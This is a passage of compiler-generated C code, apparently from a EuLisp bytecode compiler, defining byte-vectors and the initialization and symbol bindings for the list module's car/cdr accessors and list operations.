,47),I(23,00,00,00),B(list ,175),I(3b,02,48,00),I(01,1d,1d,47),I(00,01,3d,02),I(04,45,04,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 177 binding: cdddar */\n  static const void *G004581[] = {I(aa,74,75,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 178 binding: cddadr */\n  static const void *G004583[] = {I(aa,73,75,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 179 binding: caaaar */\n  static const void *G004585[] = {I(aa,72,72,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 180 binding: caaddr */\n  static const void *G004587[] = {I(aa,75,72,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 9 is_init: 0 index: 181 binding: anonymous */\n  static const void *G004589[] = {I(aa,1b,11,12),I(1b,44,0b,1c),I(10,47,00,01),I(3d,01,02,36),I(11,1c,10,47),I(00,00,3c,01),I(2a,1c,11,47),I(00,02,3d,01),I(02,45,02,00)};\n\n  /* Byte-vector with size: 15 is_init: 0 index: 182 binding: do1-list-last-special */\n  static const void *G004591[] = {I(43,03,46,03),I(1d,48,00,00),I(1c,48,00,01),I(86,1b,48,00),I(02,23,00,00),B(list ,47),I(23,00,00,00),B(list ,181),I(3b,01,48,00),I(02,1c,44,12),I(1c,47,00,02),I(3c,01,1b,44),I(04,86,36,02),I(86,22,01,36),I(02,86,45,04)};\n\n  /* Byte-vector with size: 21 is_init: 0 index: 183 binding: as-proper-list */\n  static const void *G004593[] = {I(aa,1b,7a,1b),I(44,2d,1c,11),I(1b,44,06,1b),I(7a,12,36,02),I(86,1b,44,0f),I(1f,03,11,1b),I(86,0f,1f,05),I(1c,90,22,02),I(36,0d,1f,03),I(11,24,00,00),B(list ,16),I(3c,01,22,02),I(36,02,86,2a),I(1c,7a,1b,44),I(04,1b,36,03),I(1d,12,1b,44),I(05,1f,03,36),I(0b,1f,03,24),B(boot1 ,26),I(3d,01,04,45),I(04,00,00,00)};\n\n  /* Byte-vector with size: 17 is_init: 0 index: 184 binding: anonymous */\n  static const void *G004595[] = {I(43,03,1d,12),I(1b,44,04,1b),I(36,03,1d,12),I(1b,44,0f,1d),I(24,00,00,00),B(boot ,28),I(3d,01,05,36),I(25,1f,04,11),I(1f,04,11,1f),I(06,10,1f,06),I(10,1c,1c,47),I(00,00,3c,02),I(1b,1f,08,0f),I(1f,05,1f,05),I(1d,47,00,01),I(3d,03,0b,22),I(06,45,05,00)};\n\n  /* Byte-vector with size: 11 is_init: 0 index: 185 binding: map2-list */\n  static const void *G004597[] = {I(43,03,46,02),I(1d,48,00,00),I(86,1b,48,00),I(01,23,00,00),B(list ,47),I(23,00,00,00),B(list ,184),I(3b,03,48,00),I(01,1d,1d,86),I(47,00,01,3d),I(03,04,45,04)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 186 binding: cadadr */\n  static const void *G004599[] = {I(aa,73,73,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 1 is_init: 0 index: 187 binding: cadddr */\n  static const void *G004601[] = {I(aa,77,45,00)};\n\n  /* Byte-vector with size: 1 is_init: 0 index: 188 binding: cddr */\n  static const void *G004603[] = {I(aa,75,45,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 189 binding: caadar */\n  static const void *G004605[] = {I(aa,74,72,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 11 is_init: 0 index: 190 binding: anonymous */\n  static const void *G004607[] = {I(ab,1c,12,1b),I(44,04,1b,36),I(03,1c,12,1b),I(44,04,86,36),I(19,1f,03,10),I(1f,03,10,47),I(00,00,3c,02),I(2a,1f,03,11),I(1f,03,11,47),I(00,01,3d,02),I(04,45,04,00)};\n\n  /* Byte-vector with size: 11 is_init: 0 index: 191 binding: do2-list */\n  static const void *G004609[] = {I(43,03,46,02),I(1d,48,00,00),I(86,1b,48,00),I(01,23,00,00),B(list ,47),I(23,00,00,00),B(list ,190),I(3b,02,48,00),I(01,1d,1d,47),I(00,01,3d,02),I(04,45,04,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 192 binding: caadr */\n  static const void *G004611[] = {I(aa,73,10,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 193 binding: accumulate1-list */\n  static const void *G004613[] = {I(ab,1b,44,18),I(1b,10,1c,11),I(1f,03,1d,1d),I(24,00,00,00),B(list ,26),I(3d,03,04,22),I(02,36,02,86),I(45,02,00,00)};\n\n  /* Byte-vector with size: 7 is_init: 0 index: 194 binding: proper-list? */\n  static const void *G004615[] = {I(aa,1b,7a,12),I(1b,44,05,1c),I(12,36,0d,1c),I(11,24,00,00),B(list ,25),I(3d,01,02,45),I(02,00,00,00)};\n\n  /* Byte-vector with size: 10 is_init: 0 index: 195 binding: anonymous */\n  static const void *G004617[] = {I(aa,1b,7a,12),I(1b,44,06,47),I(00,01,36,1b),I(1c,10,47,00),I(01,1c,47,00),I(00,3c,02,1b),I(48,00,01,1f),I(03,11,47,00),I(02,3d,01,04),I(22,02,45,02)};\n\n  /* Byte-vector with size: 12 is_init: 0 index: 196 binding: accumulate-list */\n  static const void *G004619[] = {I(43,03,46,03),I(1d,48,00,00),I(1c,48,00,01),I(86,1b,48,00),I(02,23,00,00),B(list ,47),I(23,00,00,00),B(list ,195),I(3b,01,48,00),I(02,1c,47,00),I(02,3d,01,04),I(45,04,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 197 binding: cddaar */\n  static const void *G004621[] = {I(aa,72,75,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 15 is_init: 0 index: 198 binding: anonymous */\n  static const void *G004623[] = {I(ab,1c,11,12),I(1b,44,19,1d),I(10,1b,47,00),I(01,3c,01,1b),I(1f,04,0f,24),B(boot ,28),I(3d,01,05,22),I(02,36,1b,1d),I(11,1f,03,10),I(1b,47,00,00),I(3c,01,1b,1f),I(05,0f,1f,03),I(1c,47,00,02),I(3d,02,07,22),I(04,45,03,00)};\n\n  /* Byte-vector with size: 14 is_init: 0 index: 199 binding: map1-list-last-special */\n  static const void *G004625[] = {I(43,03,46,03),I(1d,48,00,00),I(1c,48,00,01),I(86,1b,48,00),I(02,23,00,00),B(list ,47),I(23,00,00,00),B(list ,198),I(3b,02,48,00),I(02,1c,44,0b),I(1c,86,47,00),I(02,3d,02,04),I(36,02,86,45),I(04,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 200 binding: cadar */\n  static const void *G004627[] = {I(aa,74,10,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 1 is_init: 0 index: 201 binding: cadr */\n  static const void *G004629[] = {I(aa,73,45,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 202 binding: cdadr */\n  static const void *G004631[] = {I(aa,73,11,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 1 is_init: 0 index: 203 binding: caddr */\n  static const void *G004633[] = {I(aa,76,45,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 204 binding: cdaar */\n  static const void *G004635[] = {I(aa,72,11,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 205 binding: caaar */\n  static const void *G004637[] = {I(aa,72,10,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 206 binding: cdadar */\n  static const void *G004639[] = {I(aa,74,74,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 207 binding: caaadr */\n  static const void *G004641[] = {I(aa,11,72,10),I(45,00,00,00)};\n\n  /* Byte-vector with size: 18 is_init: 0 index: 208 binding: anonymous */\n  static const void *G004643[] = {I(ab,1c,12,1b),I(44,0c,1c,24),B(boot ,28),I(3d,01,03,36),I(34,1d,10,47),I(00,00,1c,47),I(00,01,24,00),B(boot ,5),I(3c,03,1b,44),I(10,1f,04,11),I(1d,1f,05,0f),I(47,00,02,3d),I(02,05,36,0f),I(1f,04,11,1b),I(1f,05,47,00),I(02,3d,02,06),I(22,01,22,02),I(45,03,00,00)};\n\n  /* Byte-vector with size: 12 is_init: 0 index: 209 binding: select-list */\n  static const void *G004645[] = {I(43,fd,46,03),I(1d,48,00,00),I(1b,48,00,01),I(86,1b,48,00),I(02,23,00,00),B(list ,47),I(23,00,00,00),B(list ,208),I(3b,02,48,00),I(02,1d,86,47),I(00,02,3d,02),I(04,45,04,00)};\n\n  /* Byte-vector with size: 13 is_init: 0 index: 210 binding: anonymous */\n  static const void *G004647[] = {I(aa,1b,7a,12),I(1b,44,14,1c),I(12,1b,44,04),I(87,36,08,1d),I(47,00,00,3d),I(01,03,22,01),I(36,18,1c,10),I(47,00,00,3c),I(01,1b,44,0b),I(1d,11,47,00),I(01,3d,01,03),I(36,02,86,22),I(01,45,02,00)};\n\n  /* Byte-vector with size: 11 is_init: 0 index: 211 binding: all?1-list */\n  static const void *G004649[] = {I(ab,46,02,1c),I(48,00,00,86),I(1b,48,00,01),I(23,00,00,00),B(list ,47),I(23,00,00,00),B(list ,210),I(3b,01,48,00),I(01,1c,47,00),I(01,3d,01,03),I(45,03,00,00)};\n\n  /* Byte-vector with size: 1 is_init: 0 index: 212 binding: caar */\n  static const void *G004651[] = {I(aa,72,45,00)};\n\n  /* Byte-vector with size: 17 is_init: 0 index: 213 binding: slice-list */\n  static const void *G004653[] = {I(43,03,1c,1c),I(24,00,00,00),B(compare ,11),I(3c,02,1b,44),I(04,86,36,2c),I(1f,03,1f,03),I(24,00,00,00),B(collect ,20),I(3c,02,1f,03),I(83,24,00,00),B(number ,11),I(3c,02,1f,05),I(1c,1f,05,24),B(list ,40),I(3c,03,1d,1c),I(0f,22,03,45),I(04,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 214 binding: cdaadr */\n  static const void *G004655[] = {I(aa,73,74,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 11 is_init: 0 index: 215 binding: anonymous */\n  static const void *G004657[] = {I(aa,1b,12,1b),I(44,04,86,36),I(1f,1c,72,47),I(00,00,1c,47),I(00,02,3c,02),I(1b,44,06,1f),I(03,10,36,0a),I(1f,03,11,47),I(00,01,3d,01),I(04,22,02,45),I(02,00,00,00)};\n\n  /* Byte-vector with size: 22 is_init: 0 index: 216 binding: member-alist */\n  static const void *G004659[] = {I(43,fd,46,04),I(1d,48,00,00),I(1b,12,1b,44),I(04,1b,36,0a),I(1c,10,24,00),B(boot1 ,22),I(50,1b,44,0e),I(1f,03,47,00),I(00,1b,1d,86),I(6a,22,02,36),I(2b,1d,10,1b),I(48,00,02,86),I(1b,48,00,01),I(23,00,00,00),B(list ,47),I(23,00,00,00),B(list ,215),I(3b,01,48,00),I(01,1f,05,47),I(00,01,3d,01),I(07,22,02,45),I(05,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 217 binding: cdddr */\n  static const void *G004661[] = {I(aa,75,11,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 218 binding: cdaddr */\n  static const void *G004663[] = {I(aa,75,74,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 301 is_init: 1 index: 0 binding: initialize-list */\n  static const void *G004665[] = {I(87,25,00,00),B(list ,1),I(24,00,00,00),B(fpi ,1),I(3e,0b,24,00),B(fpi ,0),I(3c,00,21,01),I(24,00,00,00),B(number ,1),I(3e,0b,24,00),B(number ,0),I(3c,00,21,01),I(24,00,00,00),B(copy ,1),I(3e,0b,24,00),B(copy ,0),I(3c,00,21,01),I(24,00,00,00),B(collect ,1),I(3e,0b,24,00),B(collect ,0),I(3c,00,21,01),I(24,00,00,00),B(compare ,1),I(3e,0b,24,00),B(compare ,0),I(3c,00,21,01),I(24,00,00,00),B(convert ,1),I(3e,0b,24,00),B(convert ,0),I(3c,00,21,01),I(24,00,00,00),B(telos ,1),I(3e,0b,24,00),B(telos ,0),I(3c,00,21,01),I(23,00,00,00),B(list ,219),I(23,00,00,00),B(list ,218),I(3b,01,25,00),B(list ,44),I(23,00,00,00),B(list ,220),I(23,00,00,00),B(list ,217),I(3b,01,25,00),B(list ,43),I(23,00,00,00),B(list ,221),I(23,00,00,00),B(list ,216),I(3b,fd,25,00),B(list ,42),I(23,00,00,00),B(list ,222),I(23,00,00,00),B(list ,214),I(3b,01,25,00),B(list ,41),I(23,00,00,00),B(list ,223),I(23,00,00,00),B(list ,213),I(3b,03,25,00),B(list ,40),I(23,00,00,00),B(list ,224),I(23,00,00,00),B(list ,212),I(3b,01,25,00),B(list ,39),I(23,00,00,00),B(list ,225),I(23,00,00,00),B(list ,211),I(3b,02,25,00),B(list ,38),I(23,00,00,00),B(list ,226),I(23,00,00,00),B(list ,209),I(3b,fd,25,00),B(list ,37),I(23,00,00,00),B(list ,227),I(23,00,00,00),B(list ,207),I(3b,01,25,00),B(list ,36),I(23,00,00,00),B(list ,228),I(23,00,00,00),B(list ,206),I(3b,01,25,00),B(list ,35),I(23,00,00,00),B(list ,229),I(23,00,00,00),B(list ,205),I(3b,01,25,00),B(list ,34),I(23,00,00,00),B(list ,230),I(23,00,00,00),B(list ,204),I(3b,01,25,00),B(list ,33),I(23,00,00,00),B(list ,231),I(23,00,00,00),B(list ,203),I(3b,01,25,00),B(list ,32),I(23,00,00,00),B(list ,232),I(23,00,00,00),B(list ,202),I(3b,01,25,00),B(list ,31),I(23,00,00,00),B(list ,233),I(23,00,00,00),B(list ,201),I(3b,01,25,00),B(list ,30),I(23,00,00,00),B(list ,234),I(23,00,00,00),B(list ,200),I(3b,01,25,00),B(list ,29),I(23,00,00,00),B(list ,235),I(23,00,00,00),B(list ,199),I(3b,03,25,00),B(list ,28),I(23,00,00,00),B(list ,236),I(23,00,00,00),B(list ,197),I(3b,01,25,00),B(list ,27),I(23,00,00,00),B(list ,237),I(23,00,00,00),B(list ,196),I(3b,03,25,00),B(list ,26),I(23,00,00,00),B(list ,238),I(23,00,00,00),B(list ,194),I(3b,01,25,00),B(list ,25),I(23,00,00,00),B(list ,239),I(23,00,00,00),B(list ,193),I(3b,02,25,00),B(list ,24),I(23,00,00,00),B(list ,240),I(23,00,00,00),B(list ,192),I(3b,01,25,00),B(list ,23),I(23,00,00,00),B(list ,241),I(23,00,00,00),B(list ,191),I(3b,03,25,00),B(list ,22),I(23,00,00,00),B(list ,242),I(23,00,00,00),B(list ,189),I(3b,01,25,00),B(list ,21),I(23,00,00,00),B(list ,243),I(23,00,00,00),B(list ,188),I(3b,01,25,00),B(list ,20),I(23,00,00,00),B(list ,244),I(23,00,00,00),B(list ,187),I(3b,01,25,00),B(list ,19),I(23,00,00,00),B(list ,245),I(23,00,00,00),B(list ,186),I(3b,01,25,00),B(list ,18),I(23,00,00,00),B(list ,246),I(23,00,00,00),B(list ,185),I(3b,03,25,00),B(list ,17),I(23,00,00,00),B(list ,247),I(23,00,00,00),B(list ,183),I(3b,01,25,00),B(list ,16),I(23,00,00,00),B(list ,248),I(23,00,00,00),B(list ,182),I(3b,03,25,00),B(list ,15),I(23,00,00,00),B(list ,249),I(23,00,00,00),B(list ,180),I(3b,01,25,00),B(list ,14),I(23,00,00,00),B(list ,250),I(23,00,00,00),B(list ,179),I(3b,01,25,00),B(list ,13),I(23,00,00,00),B(list ,251),I(23,00,00,00),B(list ,178),I(3b,01,25,00),B(list ,12),I(23,00,00,00),B(list ,252),I(23,00,00,00),B(list ,177),I(3b,01,25,00),B(list ,11),I(23,00,00,00),B(list ,253),I(23,00,00,00),B(list ,176),I(3b,03,25,00),B(list ,10),I(23,00,00,00),B(list ,254),I(23,00,00,00),B(list ,174),I(3b,01,25,00),B(list ,9),I(23,00,00,00),B(list ,255),I(23,00,00,00),B(list ,173),I(3b,02,25,00),B(list ,8),I(23,00,00,00),B(list ,256),I(23,00,00,00),B(list ,171),I(3b,01,25,00),B(list ,7),I(23,00,00,00),B(list ,257),I(23,00,00,00),B(list ,170),I(3b,01,25,00),B(list ,6),I(23,00,00,00),B(list ,258),I(23,00,00,00),B(list ,169),I(3b,01,25,00),B(list ,5),I(23,00,00,00),B(list ,259),I(23,00,00,00),B(list ,168),I(3b,01,25,00),B(list ,4),I(23,00,00,00),B(list ,260),I(23,00,00,00),B(list ,167),I(3b,02,25,00),B(list ,3),I(23,00,00,00),B(list ,261),I(23,00,00,00),B(list ,166),I(3b,01,25,00),B(list ,2),I(23,00,00,00),B(list ,262),I(23,00,00,00),B(list ,165),I(3b,00,3d,00),I(00,ac,00,00)};\n\n\n  /* Initializations */\n  eul_allocate_bytevector( G004372,G004371);\n  eul_allocate_bytevector( G004374,G004373);\n  eul_intern_symbol(sym_4377,\"anonymous\");\n  eul_allocate_bytevector( G004376,G004375);\n  eul_allocate_bytevector( G004379,G004378);\n  eul_allocate_bytevector( G004381,G004380);\n  eul_allocate_bytevector( G004383,G004382);\n  eul_allocate_bytevector( G004385,G004384);\n  eul_allocate_bytevector( G004387,G004386);\n  eul_allocate_bytevector( G004389,G004388);\n  eul_allocate_bytevector( G004391,G004390);\n  eul_allocate_bytevector( G004393,G004392);\n  eul_allocate_bytevector( G004395,G004394);\n  eul_allocate_bytevector( G004397,G004396);\n  eul_allocate_bytevector( G004399,G004398);\n  eul_allocate_bytevector( G004401,G004400);\n  eul_allocate_bytevector( G004403,G004402);\n  eul_allocate_bytevector( G004405,G004404);\n  eul_allocate_bytevector( G004407,G004406);\n  eul_allocate_bytevector( G004409,G004408);\n  eul_allocate_bytevector( G004411,G004410);\n  eul_allocate_bytevector( G004413,G004412);\n  eul_allocate_bytevector( G004415,G004414);\n  eul_allocate_bytevector( G004417,G004416);\n  eul_allocate_bytevector( G004419,G004418);\n  eul_allocate_bytevector( G004421,G004420);\n  eul_allocate_bytevector( G004423,G004422);\n  eul_allocate_bytevector( G004425,G004424);\n  eul_allocate_bytevector( G004427,G004426);\n  eul_allocate_bytevector( G004429,G004428);\n  eul_allocate_bytevector( G004431,G004430);\n  eul_allocate_bytevector( G004433,G004432);\n  eul_allocate_bytevector( G004435,G004434);\n  eul_allocate_bytevector( G004437,G004436);\n  eul_allocate_bytevector( G004439,G004438);\n  eul_allocate_bytevector( G004441,G004440);\n  eul_allocate_bytevector( G004443,G004442);\n  eul_allocate_bytevector( G004445,G004444);\n  eul_allocate_bytevector( G004447,G004446);\n  eul_allocate_bytevector( G004449,G004448);\n  eul_allocate_bytevector( G004451,G004450);\n  eul_allocate_bytevector( G004453,G004452);\n  eul_allocate_bytevector( G004455,G004454);\n  eul_allocate_bytevector( G004457,G004456);\n  eul_allocate_bytevector( G004459,G004458);\n  eul_allocate_bytevector( G004461,G004460);\n  eul_allocate_bytevector( G004463,G004462);\n  eul_allocate_bytevector( G004465,G004464);\n  eul_allocate_bytevector( G004467,G004466);\n  eul_allocate_bytevector( G004469,G004468);\n  eul_allocate_bytevector( G004471,G004470);\n  eul_allocate_bytevector( G004473,G004472);\n  eul_allocate_bytevector( G004475,G004474);\n  eul_allocate_bytevector( G004477,G004476);\n  eul_allocate_bytevector( G004479,G004478);\n  eul_allocate_bytevector( G004481,G004480);\n  eul_allocate_bytevector( G004483,G004482);\n  eul_allocate_bytevector( G004485,G004484);\n  eul_allocate_bytevector( G004487,G004486);\n  eul_allocate_bytevector( G004489,G004488);\n  eul_allocate_bytevector( G004491,G004490);\n  eul_allocate_bytevector( G004493,G004492);\n  eul_allocate_bytevector( G004495,G004494);\n  eul_allocate_bytevector( G004497,G004496);\n  eul_allocate_bytevector( G004499,G004498);\n  eul_intern_symbol(sym_4502,\"(method binary=)\");\n  eul_intern_symbol(sym_4503,\"(method do)\");\n  eul_intern_symbol(sym_4504,\"(method map)\");\n  eul_intern_symbol(sym_4505,\"(setter caar)\");\n  eul_intern_symbol(sym_4506,\"(setter cadr)\");\n  eul_intern_symbol(sym_4507,\"(setter cdar)\");\n  eul_intern_symbol(sym_4508,\"(setter cddr)\");\n  eul_intern_symbol(sym_4509,\"(setter caddr)\");\n  eul_intern_symbol(sym_4510,\"(setter cdadr)\");\n  eul_intern_symbol(sym_4511,\"(setter cddar)\");\n  eul_intern_symbol(sym_4512,\"(setter caadr)\");\n  eul_intern_symbol(sym_4513,\"(setter cdaar)\");\n  eul_intern_symbol(sym_4514,\"(setter cadar)\");\n  eul_intern_symbol(sym_4515,\"(setter caaar)\");\n  eul_intern_symbol(sym_4516,\"(setter cdddr)\");\n  eul_intern_symbol(sym_4517,\"(setter caaaar)\");\n  eul_intern_symbol(sym_4518,\"(setter caaadr)\");\n  eul_intern_symbol(sym_4519,\"(setter caadar)\");\n  eul_intern_symbol(sym_4520,\"(setter caaddr)\");\n  eul_intern_symbol(sym_4521,\"(setter cadaar)\");\n  eul_intern_symbol(sym_4522,\"(setter cadadr)\");\n  eul_intern_symbol(sym_4523,\"(setter caddar)\");\n  eul_intern_symbol(sym_4524,\"(setter cadddr)\");\n  eul_intern_symbol(sym_4525,\"(setter cdaaar)\");\n  eul_intern_symbol(sym_4526,\"(setter cdaadr)\");\n  eul_intern_symbol(sym_4527,\"(setter cdadar)\");\n  eul_intern_symbol(sym_4528,\"(setter cdaddr)\");\n  eul_intern_symbol(sym_4529,\"(setter cddaar)\");\n  eul_intern_symbol(sym_4530,\"(setter cddadr)\");\n  eul_intern_symbol(sym_4531,\"(setter cdddar)\");\n  eul_intern_symbol(sym_4532,\"(setter cddddr)\");\n  eul_intern_symbol(sym_4533,\"(method element)\");\n  eul_intern_symbol(sym_4534,\"(method (setter element))\");\n  eul_intern_symbol(sym_4535,\"(method size)\");\n  eul_intern_symbol(sym_4536,\"(method member)\");\n  eul_intern_symbol(sym_4537,\"(method find)\");\n  eul_intern_symbol(sym_4538,\"(method any?)\");\n  eul_intern_symbol(sym_4539,\"(method all?)\");\n  eul_intern_symbol(sym_4540,\"(method select)\");\n  eul_intern_symbol(sym_4541,\"(method reverse)\");\n  eul_intern_symbol(sym_4542,\"(method sort)\");\n  eul_intern_symbol(sym_4543,\"(method remove)\");\n  eul_intern_symbol(sym_4544,\"(method concatenate)\");\n  eul_intern_symbol(sym_4545,\"(method slice)\");\n  eul_intern_symbol(sym_4546,\"(method accumulate)\");\n  eul_intern_symbol(sym_4547,\"(method accumulate1)\");\n  eul_intern_symbol(sym_4549,\"converter\");\n  eul_intern_symbol(sym_4551,\"<list>\");\n  object_class(cons_4550) = eul_static_cons_class;\n  eul_car(cons_4550) = sym_4551;\n  eul_cdr(cons_4550) = eul_nil;\n  object_class(cons_4548) = eul_static_cons_class;\n  eul_car(cons_4548) = sym_4549;\n  object_class(cons_4553) = eul_static_cons_class;\n  eul_car(cons_4553) = sym_4551;\n  eul_cdr(cons_4553) = eul_nil;\n  object_class(cons_4552) = eul_static_cons_class;\n  eul_car(cons_4552) = sym_4549;\n  eul_intern_symbol(sym_4554,\"(method shallow-copy)\");\n  eul_intern_symbol(sym_4555,\"(method deep-copy)\");\n  eul_intern_symbol(sym_4556,\"(method binary+)\");\n  eul_intern_symbol(sym_4557,\"(method binary-)\");\n  eul_intern_symbol(sym_4558,\"(method binary/)\");\n  eul_allocate_bytevector( G004501,G004500);\n  eul_allocate_bytevector( G004560,G004559);\n  eul_allocate_bytevector( G004562,G004561);\n  eul_allocate_bytevector( G004564,G004563);\n  eul_allocate_bytevector( G004566,G004565);\n  eul_allocate_bytevector( G004568,G004567);\n  eul_allocate_bytevector( G004570,G004569);\n  eul_allocate_bytevector( G004572,G004571);\n  eul_allocate_bytevector( G004574,G004573);\n  eul_allocate_bytevector( G004576,G004575);\n  eul_allocate_bytevector( G004578,G004577);\n  eul_allocate_bytevector( G004580,G004579);\n  eul_allocate_bytevector( G004582,G004581);\n  eul_allocate_bytevector( G004584,G004583);\n  eul_allocate_bytevector( G004586,G004585);\n  eul_allocate_bytevector( G004588,G004587);\n  eul_allocate_bytevector( G004590,G004589);\n  eul_allocate_bytevector( G004592,G004591);\n  eul_allocate_bytevector( G004594,G004593);\n  eul_allocate_bytevector( G004596,G004595);\n  eul_allocate_bytevector( G004598,G004597);\n  eul_allocate_bytevector( G004600,G004599);\n  eul_allocate_bytevector( G004602,G004601);\n  eul_allocate_bytevector( G004604,G004603);\n  eul_allocate_bytevector( G004606,G004605);\n  eul_allocate_bytevector( G004608,G004607);\n  eul_allocate_bytevector( G004610,G004609);\n  eul_allocate_bytevector( G004612,G004611);\n  eul_allocate_bytevector( G004614,G004613);\n  eul_allocate_bytevector( G004616,G004615);\n  eul_allocate_bytevector( G004618,G004617);\n  eul_allocate_bytevector( G004620,G004619);\n  eul_allocate_bytevector( G004622,G004621);\n  eul_allocate_bytevector( G004624,G004623);\n  eul_allocate_bytevector( G004626,G004625);\n  eul_allocate_bytevector( G004628,G004627);\n  eul_allocate_bytevector( G004630,G004629);\n  eul_allocate_bytevector( G004632,G004631);\n  eul_allocate_bytevector( G004634,G004633);\n  eul_allocate_bytevector( G004636,G004635);\n  eul_allocate_bytevector( G004638,G004637);\n  eul_allocate_bytevector( G004640,G004639);\n  eul_allocate_bytevector( G004642,G004641);\n  eul_allocate_bytevector( G004644,G004643);\n  eul_allocate_bytevector( G004646,G004645);\n  eul_allocate_bytevector( G004648,G004647);\n  eul_allocate_bytevector( G004650,G004649);\n  eul_allocate_bytevector( G004652,G004651);\n  eul_allocate_bytevector( G004654,G004653);\n  eul_allocate_bytevector( G004656,G004655);\n  eul_allocate_bytevector( G004658,G004657);\n  eul_allocate_bytevector( G004660,G004659);\n  eul_allocate_bytevector( G004662,G004661);\n  eul_allocate_bytevector( G004664,G004663);\n  eul_intern_symbol(sym_4667,\"cdaddr\");\n  eul_intern_symbol(sym_4668,\"cdddr\");\n  eul_intern_symbol(sym_4669,\"member-alist\");\n  eul_intern_symbol(sym_4670,\"cdaadr\");\n  eul_intern_symbol(sym_4671,\"slice-list\");\n  eul_intern_symbol(sym_4672,\"caar\");\n  eul_intern_symbol(sym_4673,\"all?1-list\");\n  eul_intern_symbol(sym_4674,\"select-list\");\n  eul_intern_symbol(sym_4675,\"caaadr\");\n  eul_intern_symbol(sym_4676,\"cdadar\");\n  eul_intern_symbol(sym_4677,\"caaar\");\n  eul_intern_symbol(sym_4678,\"cdaar\");\n  eul_intern_symbol(sym_4679,\"caddr\");\n  eul_intern_symbol(sym_4680,\"cdadr\");\n  eul_intern_symbol(sym_4681,\"cadr\");\n  eul_intern_symbol(sym_4682,\"cadar\");\n  eul_intern_symbol(sym_4683,\"map1-list-last-special\");\n  eul_intern_symbol(sym_4684,\"cddaar\");\n  eul_intern_symbol(sym_4685,\"accumulate-list\");\n  eul_intern_symbol(sym_4686,\"proper-list?\");\n  eul_intern_symbol(sym_4687,\"accumulate1-list\");\n  eul_intern_symbol(sym_4688,\"caadr\");\n  eul_intern_symbol(sym_4689,\"do2-list\");\n  eul_intern_symbol(sym_4690,\"caadar\");\n  eul_intern_symbol(sym_4691,\"cddr\");\n  eul_intern_symbol(sym_4692,\"cadddr\");\n  eul_intern_symbol(sym_4693,\"cadadr\");\n  eul_intern_symbol(sym_4694,\"map2-list\");\n  eul_intern_symbol(sym_4695,\"as-proper-list\");\n  eul_intern_symbol(sym_4696,\"do1-list-last-special\");\n  eul_intern_symbol(sym_4697,\"caaddr\");\n  eul_intern_symbol(sym_4698,\"caaaar\");\n  eul_intern_symbol(sym_4699,\"cddadr\");\n  eul_intern_symbol(sym_4700,\"cdddar\");\n  eul_intern_symbol(sym_4701,\"all?2-list\");\n  eul_intern_symbol(sym_4702,\"cddar\");\n  eul_intern_symbol(sym_4703,\"find1-list\");\n  eul_intern_symbol(sym_4704,\"cadaar\");\n  eul_intern_symbol(sym_4705,\"cdar\");\n  eul_intern_symbol(sym_4706,\"caddar\");\n  eul_intern_symbol(sym_4707,\"cdaaar\");\n  eul_intern_symbol(sym_4708,\"list-drop\");\n  eul_intern_symbol(sym_4709,\"cddddr\");\n  eul_intern_symbol(sym_4710,\"top-level\");\n  eul_allocate_bytevector( G004666,G004665);\n\n  /* Set local bindings */\n  {\n    int i;\n    for (i = 2; i < 45; i++)\n      list_bindings[i] = eul_nil;\n  }\n\n  list_bindings[ 45] = G004372;\n  list_bindings[ 46] = G004374;\n  list_bindings[ 47] = sym_4377;\n  list_bindings[ 48] = G004376;\n  list_bindings[ 49] = G004379;\n  list_bindings[ 50] = G004381;\n  list_bindings[ 51] = G004383;\n  list_bindings[ 52] = G004385;\n  list_bindings[ 53] = G004387;\n  list_bindings[ 54] = G004389;\n  list_bindings[ 55] = G004391;\n  list_bindings[ 56] = G004393;\n  list_bindings[ 57] = G004395;\n  list_bindings[ 58] = G004397;\n  list_bindings[ 59] = G004399;\n  list_bindings[ 60] = G004401;\n  list_bindings[ 61] = G004403;\n  list_bindings[ 62] = G004405;\n  list_bindings[ 63] = G004407;\n  list_bindings[ 64] = G004409;\n  list_bindings[ 65] = G004411;\n  list_bindings[ 66] = G004413;\n  list_bindings[ 67] = G004415;\n  list_bindings[ 68] = G004417;\n  list_bindings[ 69] = G004419;\n  list_bindings[ 70] = G004421;\n  list_bindings[ 71] = G004423;\n  list_bindings[ 72] = G004425;\n  list_bindings[ 73] = G004427;\n  list_bindings[ 74] = G004429;\n  list_bindings[ 75] = G004431;\n  list_bindings[ 76] = G004433;\n  list_bindings[ 77] = G004435;\n  list_bindings[ 78] = G004437;\n  list_bindings[ 79] = G004439;\n  list_bindings[ 80] = G004441;\n  list_bindings[ 81] = G004443;\n  list_bindings[ 82] = G004445;\n  list_bindings[ 83] = G004447;\n  list_bindings[ 84] = G004449;\n  list_bindings[ 85] = G004451;\n  list_bindings[ 86] = G004453;\n  list_bindings[ 87] = G004455;\n  list_bindings[ 88] = G004457;\n  list_bindings[ 89] = G004459;\n  list_bindings[ 90] = G004461;\n  list_bindings[ 91] = G004463;\n  list_bindings[ 92] = G004465;\n  